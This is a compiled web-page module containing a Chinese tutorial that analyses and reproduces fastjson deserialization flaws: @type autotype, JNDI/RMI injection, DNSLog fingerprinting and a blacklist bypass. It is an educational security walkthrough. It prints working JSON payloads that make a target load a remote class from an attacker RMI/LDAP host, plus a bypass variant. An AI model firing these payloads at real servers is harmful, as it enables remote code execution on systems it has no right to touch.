import{_ as n}from"./plugin-vue_export-helper-x3n3nnut.js";import{o as s,c as a,e as t}from"./app-G6uhcosD.js";const p="/DailyNotes/assets/image-20230528174741610-z1ChWoFE.png",o="/DailyNotes/assets/v2-4d7997d41a1a1b86b9199698750d664f_720w-ZkQM-vrU.webp",e="/DailyNotes/assets/image-20230609092625125-wUzE0pt7.png",c="/DailyNotes/assets/image-20230609092501016-Bq6ZcKMN.png",i="/DailyNotes/assets/image-20230609092537974-D-SX7B7O.png",l="/DailyNotes/assets/image-20230703151327234-ls6D8Img.png",u="/DailyNotes/assets/image-20230703162124405-Yy7fi7sA.png",r="/DailyNotes/assets/image-20230703162343567-TUWrBget.png",d="/DailyNotes/assets/image-20230703151711466-1eWXzEzE.png",k="/DailyNotes/assets/image-20230703151809119-xSv-k4Ac.png",g="/DailyNotes/assets/image-20230609101653093-THMxAQOi.png",m="/DailyNotes/assets/image-20230609101243387-f0AnvM_o.png",v="/DailyNotes/assets/image-20230608131335095-k3e4E79L.png",b="/DailyNotes/assets/image-20230608173650227-3CcHATZT.png",f="/DailyNotes/assets/image-20230619160428015-0uwQ8IKj.png",y="/DailyNotes/assets/image-20230619162916883-2_qnvm9Z.png",h="/DailyNotes/assets/image-20230619160718725-9-pwY6p-.png",q="/DailyNotes/assets/image-20230619161609186-bKOY90e7.png",j="/DailyNotes/assets/image-20230619162339270-18cXlupj.png",N="/DailyNotes/assets/image-20230619163158122-D9Vo6iIc.png",_="/DailyNotes/assets/image-20230619163319115-VKYOx-YN.png",x="/DailyNotes/assets/image-20230619180428246-lgDuEhYL.png",S="/DailyNotes/assets/image-20230609105231200-cMV8R_6S.png",J="/DailyNotes/assets/image-20230609105736726-FY5J6D2A.png",w="/DailyNotes/assets/image-20230609142233848-cnY1PKKW.png",D="/DailyNotes/assets/image-20230609142504773-dOwu-_Gz.png",I="/DailyNotes/assets/image-20230609142713545-YMTqLvy5.png",O="/DailyNotes/assets/image-20230609142013160-tRDZdeia.png",z="/DailyNotes/assets/image-20230529100551944-W79E_I3h.png",C="/DailyNotes/assets/image-20230529100957138-z4afgpNC.png",L={},A=t(`<h1 id="fastjson漏洞分析及复现" tabindex="-1"><a class="header-anchor" href="#fastjson漏洞分析及复现" aria-hidden="true">#</a> fastjson漏洞分析及复现</h1><p>FastJson 是一个由阿里巴巴研发的java库，可以将 Java 对象转换为 JSON 格式，也可以将 JSON 字符串转换为 Java 对象。</p><p>fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p><p>fastjson 源码地址：https://github.com/alibaba/fastjson</p><p>fastjson 中文 Wiki：https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</p><h2 id="_1-fastjson反序列化方式简介" tabindex="-1"><a class="header-anchor" href="#_1-fastjson反序列化方式简介" aria-hidden="true">#</a> 1. fastjson反序列化方式简介</h2><p>fastjson<strong>序列化就是将java对象转化为json字符串，而反序列化就是将json字符串转化为java对象</strong>。</p><p>fastjson有两种常见的处理JSON的方法：</p><ul><li><code>JSON.toJSONString()</code>方法：可将对象转换成<code>JSON</code>字符串</li><li><code>JSON.parseObject()</code>方法：将<code>JSON</code>字符串转换成对象。</li></ul><p>maven引入</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>xxx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>User类：</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;call setUsername&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> username<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;call setAge&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>进行序列化及反序列化：</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token doc-comment comment">/**
 * <span class="token keyword">@author</span> :xmsong
 * <span class="token keyword">@date</span> : 2023/5/28 9:53
 */</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> parseObjectTest <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token comment">//序列化</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;---序列化---&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">User</span> user1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user1<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user1<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> json1 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>user1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//反序列化</span>
        <span class="token class-name">String</span> json2 <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;age\\&quot;:66,\\&quot;username\\&quot;:\\&quot;test\\&quot;}&quot;</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;---指定.class 反序列化---&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">User</span> user2_1 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>json2<span class="token punctuation">,</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 后面的User.class表示反序列化为User类</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user2_1<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;---不指定类 反序列化---&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">JSONObject</span> user2_2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>json2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user2_2<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;---指定@type 反序列化---&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> json3 <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;@type\\&quot;:\\&quot;User\\&quot;, \\&quot;age\\&quot;:66,\\&quot;username\\&quot;:\\&quot;test\\&quot;}&quot;</span><span class="token punctuation">;</span>
        <span class="token class-name">JSONObject</span> user3 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>json3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>


<span class="token comment">// 反序列化</span>
<span class="token comment">// 这里我们反序列化使用的是parseObject()方法，其实也可以用到parse()方法，parseObject() 本质上也是调用 parse() 进行反序列化的。</span>
<span class="token comment">// 但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()；</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>例如前面代码运行结果为：</p><figure><img src="`+p+'" alt="image-20230528174741610" tabindex="0" loading="lazy"><figcaption>image-20230528174741610</figcaption></figure><blockquote><p><code>@type</code>是<code>fastjson</code>中的一个特殊注解，用于标识<code>JSON</code>字符串中的某个属性是一个<code>Java</code>对象的类型。具体来说，当<code>fastjson</code>从<code>JSON</code>字符串反序列化为<code>Java</code>对象时，如果<code>JSON</code>字符串中包含<code>@type</code>属性，<code>fastjson</code>会根据该属性的值来确定反序列化后的<code>Java</code>对象的类型。</p></blockquote><p>Java实现Excel导入和导出 https://blog.csdn.net/bbj12345678/article/details/131370637</p><h2 id="_2-反序列化漏洞基础" tabindex="-1"><a class="header-anchor" href="#_2-反序列化漏洞基础" aria-hidden="true">#</a> 2. 反序列化漏洞基础</h2><p>上面例子可以看出，fastjson反序列化时，支持使用@type字段来指定反序列化的类型，并调用该类的set/get方法来访问属性，当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，即可构造出一些恶意利用链。但需注意JNDI注入有JDK版本限制，高版本需要进行绕过。</p><h3 id="_1-漏洞利用前提" tabindex="-1"><a class="header-anchor" href="#_1-漏洞利用前提" aria-hidden="true">#</a> （1）漏洞利用前提</h3><ol><li>用户能控制反序列化的类；</li><li>反序列化时类中的方法会被执行。</li></ol><p>对比上面三种方式可知，当指定目标类时，<code>JSON.parseObject()</code>会识别并调用指定的目标类的 <code>setter </code>方法及某些特定条件的 <code>getter </code>方法，而直接使用该方法返回的是<code>JSONObject</code>对象，是不会触发<code>setXXX</code>方法的（因为JVM也不知道是哪个类的对象）。</p><h3 id="_2-反序列化实现rce" tabindex="-1"><a class="header-anchor" href="#_2-反序列化实现rce" aria-hidden="true">#</a> （2）反序列化实现RCE</h3><p>想要在反序列化的时候调用对应方法有两种方式：</p><ol><li>在要反序列化的JSON字符串中没有<code>@types</code>时，需要将第二个参数设置为指定类，例如<code>User.class</code>，此时会返回一个User类对象。<strong>在parseObject()方法中传入类的方法，已经把反序列化的类固定了，没法通过用户来控制</strong></li><li>通过@type字段来指定该JSON应当还原成何种类型的对象，此时返回<code>JSONObject</code>。**使用@type参数的方式进行反序列化，攻击者可以构造带有@type参数的JSON发送给服务器。**在这个JSON反序列化接口处，我们传入恶意的JSON，就可以调用任意类的构造方法以及属性相关的get，set方法。 如果某类的相关方法里有危险的代码（如执行某个命令），我们就可以构造恶意JSON达到RCE的作用。</li></ol><h3 id="_3-jndi注入" tabindex="-1"><a class="header-anchor" href="#_3-jndi注入" aria-hidden="true">#</a> （3）JNDI注入</h3><p><strong>JNDI(Java Naming and Directory Interface)<strong>是一个应用程序设计的API，为开发人员提供了</strong>查找和访问各种命名和目录服务</strong>的通用、统一的接口（类似JDBC都是构建在抽象层上）。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。</p><p>**命名服务：<strong>将Java对象以某个名称的形式</strong>绑定（binding）<strong>到一个容器环境（Context）中，以后调用容器环境（Context）的</strong>查找（lookup）**方法又可以查找出某个名称所绑定的Java对象。简单来说，就是把一个Java对象和一个特定的名称关联在一起，方便容器后续使用。</p><p>**目录服务：**将一个对象的所有属性信息保存到一个容器环境中。JNDI的目录（Directory）原理与JNDI的命名（Naming）原理非常相似，主要的区别在于目录容器环境中保存的是对象的属性信息，而不是对象本身。举个例子，Name的作用是在容器环境中绑定一个Person对象，而Directory的作用是在容器环境中保存这个Person对象的属性，比如说age=10，name=小明等等。实际上，二者往往是结合在一起使用的。</p><p><code>JNDI</code>默认支持自动转换的协议：</p><table><thead><tr><th>协议名称</th><th>协议URL</th><th>Context类</th></tr></thead><tbody><tr><td>DNS协议</td><td><code>dns://</code></td><td><code>com.sun.jndi.url.dns.dnsURLContext</code></td></tr><tr><td>RMI协议</td><td><code>rmi://</code></td><td><code>com.sun.jndi.url.rmi.rmiURLContext</code></td></tr><tr><td>LDAP协议</td><td><code>ldap://</code></td><td><code>com.sun.jndi.url.ldap.ldapURLContext</code></td></tr><tr><td>LDAP协议</td><td><code>ldaps://</code></td><td><code>com.sun.jndi.url.ldaps.ldapsURLContextFactory</code></td></tr><tr><td>IIOP对象请求代理协议</td><td><code>iiop://</code></td><td><code>com.sun.jndi.url.iiop.iiopURLContext</code></td></tr><tr><td>IIOP对象请求代理协议</td><td><code>iiopname://</code></td><td><code>com.sun.jndi.url.iiopname.iiopnameURLContextFactory</code></td></tr><tr><td>IIOP对象请求代理协议</td><td><code>corbaname://</code></td><td><code>com.sun.jndi.url.corbaname.corbanameURLContextFactory</code></td></tr></tbody></table><hr><p>**RMI（Remote Method Invocation）**是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地需根据接口类的定义，提供相应的参数即可调用远程方法。</p><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。<strong>RMI服务端将URL传递给客户端，客户端通过HTTP/HTTPS请求下载这些类。</strong></p><figure><img src="'+o+'" alt="v2-4d7997d41a1a1b86b9199698750d664f_720w" tabindex="0" loading="lazy"><figcaption>v2-4d7997d41a1a1b86b9199698750d664f_720w</figcaption></figure><hr><p><strong>JNDI 注入</strong>，即当开发者在定义 <code>JNDI</code> 接口初始化时，<code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的 <code>url</code> 传入参数远程加载恶意载荷，造成注入攻击。</p><p>攻击者先准备一个恶意的命令执行的java类，如下：</p><figure><img src="'+e+'" alt="image-20230609092625125" tabindex="0" loading="lazy"><figcaption>image-20230609092625125</figcaption></figure><p>攻击者再准备一个RMI服务器，当收到rmi的请求后，就去加载上面的恶意类，将结果返回给客户端，如下：</p><figure><img src="'+c+'" alt="image-20230609092501016" tabindex="0" loading="lazy"><figcaption>image-20230609092501016</figcaption></figure><p>假设有一个客户端，使用了如下的lookup()函数，并且参数可控，只要被攻击主机发出如下的rmi请求，就会加载一个远程的恶意对象，使得攻击成功。</p><figure><img src="'+i+'" alt="image-20230609092537974" tabindex="0" loading="lazy"><figcaption>image-20230609092537974</figcaption></figure><p><strong>JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。（更高版本也有绕过）</strong></p><h2 id="_3-漏洞分析" tabindex="-1"><a class="header-anchor" href="#_3-漏洞分析" aria-hidden="true">#</a> 3. 漏洞分析</h2><h3 id="指纹判断" tabindex="-1"><a class="header-anchor" href="#指纹判断" aria-hidden="true">#</a> 指纹判断</h3><p>无特殊配置情况下fastjson，无正确的闭合会报错，返回结果里有fastjson字样。</p><figure><img src="'+l+'" alt="image-20230703151327234" tabindex="0" loading="lazy"><figcaption>image-20230703151327234</figcaption></figure><figure><img src="'+u+'" alt="image-20230703162124405" tabindex="0" loading="lazy"><figcaption>image-20230703162124405</figcaption></figure><figure><img src="'+r+'" alt="image-20230703162343567" tabindex="0" loading="lazy"><figcaption>image-20230703162343567</figcaption></figure><p>如果是配置了不返回报错信息怎么办？那这种情况就只有利用dnslog盲打了。</p><figure><img src="'+d+'" alt="image-20230703151711466" tabindex="0" loading="lazy"><figcaption>image-20230703151711466</figcaption></figure><figure><img src="'+k+`" alt="image-20230703151809119" tabindex="0" loading="lazy"><figcaption>image-20230703151809119</figcaption></figure><p><strong>盲打payload</strong>(dnslog处填写生成的域名)</p><div class="language-json line-numbers-mode" data-ext="json"><pre class="language-json"><code><span class="token comment">// 1.2.67版本前</span>
<span class="token punctuation">{</span><span class="token property">&quot;zeo&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.net.Inet4Address&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;dnslog&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment">// 1.2.67版本后</span>
<span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.net.Inet4Address&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;dnslog&quot;</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.net.Inet6Address&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;dnslog&quot;</span><span class="token punctuation">}</span>
<span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.net.InetSocketAddress&quot;</span><span class="token punctuation">{</span><span class="token property">&quot;address&quot;</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;dnslog&quot;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="fastjson-1-2-24" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-24" aria-hidden="true">#</a> fastjson&lt;=1.2.24</h3><p><code>com.sun.rowset.JdbcRowSetImpl</code>这个类可以被利用这个类中有很多的<code>setXXX</code>方法，我们需要利用的是<code>setDataSourceName()</code>和<code>setAutoCommit()</code>这两个方法，通过JNDI注入来实现RCE。</p><p>payload一般长这样：</p><div class="language-json line-numbers-mode" data-ext="json"><pre class="language-json"><code><span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;rmi://ip:port/Exploit&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span>
或者
<span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://ip:port/Exploit&quot;</span><span class="token punctuation">,</span><span class="token property">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>攻击时只需要将如下内容发送给fastjson:</p><figure><img src="`+g+'" alt="image-20230609101653093" tabindex="0" loading="lazy"><figcaption>image-20230609101653093</figcaption></figure><p>payload发送给服务端后会执行setAutoCommit()，setAutoCommit()执行了connct()函数，</p><figure><img src="'+m+'" alt="image-20230609101243387" tabindex="0" loading="lazy"><figcaption>image-20230609101243387</figcaption></figure><p>connect()会对dataSourceName属性进行一个<strong>InitialContext.lookup()</strong>，从而实现JNDI注入。</p><figure><img src="'+v+'" alt="image-20230608131335095" tabindex="0" loading="lazy"><figcaption>image-20230608131335095</figcaption></figure><hr><h3 id="_1-2-25-fastjson-1-2-41" tabindex="-1"><a class="header-anchor" href="#_1-2-25-fastjson-1-2-41" aria-hidden="true">#</a> 1.2.25&lt;=fastjson&lt;=1.2.41</h3><p>fastjson于在1.2.25开始加入了黑白名单机制，继续用1.2.24的payload（这里用TemplatesImpl的payload）去打，会发现报错autotype不支持</p><figure><img src="'+b+`" alt="image-20230608173650227" tabindex="0" loading="lazy"><figcaption>image-20230608173650227</figcaption></figure><p>究其原因，是因为在com.alibaba.fastjson.parser.ParserConfig 加入了CheckAutoType方法，传进来的@type的值要进入一个checkAutoType()方法的判断：</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span>ParserConfig</span>类中：

<span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">checkAutoType</span><span class="token punctuation">(</span><span class="token class-name">String</span> typeName<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> expectClass<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>在其中有个autotypesupport属性，如果为false，那么就会检测json中@type的值 开头是否与黑名单中的值一样，若一样就直接返回一个异常，然后加载白名单中的类</strong></p><figure><img src="`+f+`" alt="image-20230619160428015" tabindex="0" loading="lazy"><figcaption>image-20230619160428015</figcaption></figure><p>黑名单长这样:</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">this</span><span class="token punctuation">.</span>denyList <span class="token operator">=</span> <span class="token string">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot;,&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+y+'" alt="image-20230619162916883" tabindex="0" loading="lazy"><figcaption>image-20230619162916883</figcaption></figure><p><strong>若autotypesupport开启，则会先白名单加载，后黑名单检测</strong></p><figure><img src="'+h+'" alt="image-20230619160718725" tabindex="0" loading="lazy"><figcaption>image-20230619160718725</figcaption></figure><p>此处的loadclass方法如下：<strong>若类名以L开头；结尾，则会把这两个字符去掉并加载类</strong>。</p><blockquote><p>至于为什么会有这种奇怪的处理，<code>L </code>和<code>;</code>这一对字符其实是 JVM 字节码中用来表示类名的</p></blockquote><figure><img src="'+q+`" alt="image-20230619161609186" tabindex="0" loading="lazy"><figcaption>image-20230619161609186</figcaption></figure><p><strong>绕过方式</strong>：所以在autotypesupport开启时，我们可以构造如下payload来bypass</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token punctuation">{</span><span class="token string-property property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="token punctuation">,</span><span class="token string-property property">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;rmi://ip:1099&quot;</span><span class="token punctuation">,</span><span class="token string-property property">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如何开启autotypesupport？只需在json被解析前加入如下代码即可</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
